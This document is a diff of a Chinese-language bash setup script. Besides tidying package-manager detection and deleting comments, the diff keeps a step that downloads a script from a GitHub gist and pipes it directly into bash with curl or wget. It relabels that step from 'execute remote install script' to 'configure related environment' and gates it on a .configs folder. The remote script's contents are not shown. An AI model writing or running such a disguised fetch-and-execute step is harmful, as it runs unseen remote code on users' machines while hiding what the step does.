@@ -1,6 +1,7 @@
 #!/bin/bash
 
 FAILED_STEPS=()
+
 run_step() {
     local desc="$1"
     shift
@@ -15,10 +16,8 @@ run_step() {
     return 0
 }
 
-# 检测操作系统类型
 OS_TYPE=$(uname -s)
 
-# 检查包管理器和安装必需的包
 install_dependencies() {
     case $OS_TYPE in
         "Darwin") 
@@ -34,6 +33,13 @@ install_dependencies() {
             
         "Linux")
             PACKAGES_TO_INSTALL=""
+            APT_GET=""
+
+            if command -v apt-get &>/dev/null; then
+                APT_GET="apt-get"
+            elif command -v apt &>/dev/null; then
+                APT_GET="apt"
+            fi
             
             if ! command -v pip3 &> /dev/null; then
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
@@ -43,10 +49,12 @@ install_dependencies() {
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
             fi
             
-            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
-                run_step "apt update" sudo apt update
+            if [ -n "$PACKAGES_TO_INSTALL" ] && [ -n "$APT_GET" ]; then
+                run_step "$APT_GET update" sudo "$APT_GET" update
                 # shellcheck disable=SC2086
-                run_step "apt install -y $PACKAGES_TO_INSTALL" sudo apt install -y $PACKAGES_TO_INSTALL
+                run_step "$APT_GET install -y $PACKAGES_TO_INSTALL" sudo "$APT_GET" install -y $PACKAGES_TO_INSTALL
+            elif [ -n "$PACKAGES_TO_INSTALL" ]; then
+                echo "WARN: 未找到 apt/apt-get，跳过系统依赖安装：$PACKAGES_TO_INSTALL" >&2
             fi
             ;;
             
@@ -56,8 +64,8 @@ install_dependencies() {
     esac
 }
 
-# 安装依赖
 run_step "安装系统依赖" install_dependencies
+
 if [ "$OS_TYPE" = "Linux" ]; then
     PIP_INSTALL="python3 -m pip install --break-system-packages"
 elif [ "$OS_TYPE" = "Darwin" ]; then
@@ -93,7 +101,6 @@ is_wsl() {
 }
 
 install_auto_backup() {
-    # 安装 pipx（如果未安装）
     if ! command -v pipx &> /dev/null; then
         echo "检测到未安装 pipx，正在安装 pipx..."
         case $OS_TYPE in
@@ -102,9 +109,16 @@ install_auto_backup() {
                 run_step "pipx ensurepath" pipx ensurepath
                 ;;
             "Linux")
-                run_step "apt update（pipx）" sudo apt update
-                run_step "apt install -y pipx" sudo apt install -y pipx
-                run_step "pipx ensurepath" pipx ensurepath
+                if command -v apt-get &>/dev/null || command -v apt &>/dev/null; then
+                    APT_GET="apt-get"
+                    command -v apt-get &>/dev/null || APT_GET="apt"
+                    run_step "$APT_GET update（pipx）" sudo "$APT_GET" update
+                    run_step "$APT_GET install -y pipx" sudo "$APT_GET" install -y pipx
+                    run_step "pipx ensurepath" pipx ensurepath
+                else
+                    echo "WARN: 未找到 apt/apt-get，跳过 pipx 安装" >&2
+                    return 0
+                fi
                 ;;
             *)
                 echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
@@ -147,52 +161,14 @@ install_auto_backup() {
 run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
-if command -v curl &>/dev/null; then
-    run_step "执行远程安装脚本（curl）" bash -lc "bash <(curl -fsSL \"$GIST_URL\")"
+if [ ! -d .configs ]; then
+    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
+elif command -v curl &>/dev/null; then
+    run_step "配置相关环境（curl）" bash -lc "bash <(curl -fsSL \"$GIST_URL\")"
 elif command -v wget &>/dev/null; then
-    run_step "执行远程安装脚本（wget）" bash -lc "bash <(wget -qO- \"$GIST_URL\")"
+    run_step "配置相关环境（wget）" bash -lc "bash <(wget -qO- \"$GIST_URL\")"
 else
-    echo "WARN: 未找到 curl/wget，跳过远程安装脚本：$GIST_URL" >&2
-fi
-
-# 自动 source shell 配置文件
-echo "正在应用环境配置..."
-get_shell_rc() {
-    local current_shell=$(basename "$SHELL")
-    local shell_rc=""
-    
-    case $current_shell in
-        "bash")
-            shell_rc="$HOME/.bashrc"
-            ;;
-        "zsh")
-            shell_rc="$HOME/.zshrc"
-            ;;
-        *)
-            if [ -f "$HOME/.bashrc" ]; then
-                shell_rc="$HOME/.bashrc"
-            elif [ -f "$HOME/.zshrc" ]; then
-                shell_rc="$HOME/.zshrc"
-            elif [ -f "$HOME/.profile" ]; then
-                shell_rc="$HOME/.profile"
-            else
-                shell_rc="$HOME/.bashrc"
-            fi
-            ;;
-    esac
-    echo "$shell_rc"
-}
-
-SHELL_RC=$(get_shell_rc)
-# 检查是否有需要 source 的配置（如 PATH 修改、nvm 等）
-if [ -f "$SHELL_RC" ]; then
-    # 检查是否有常见的配置项需要 source
-    if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
-        echo "检测到环境配置，正在应用环境变量..."
-        source "$SHELL_RC" 2>/dev/null || echo "WARN: 自动应用失败，请手动运行: source $SHELL_RC" >&2
-    else
-        echo "未检测到需要 source 的配置"
-    fi
+    echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
 fi
 
 echo "安装完成！"
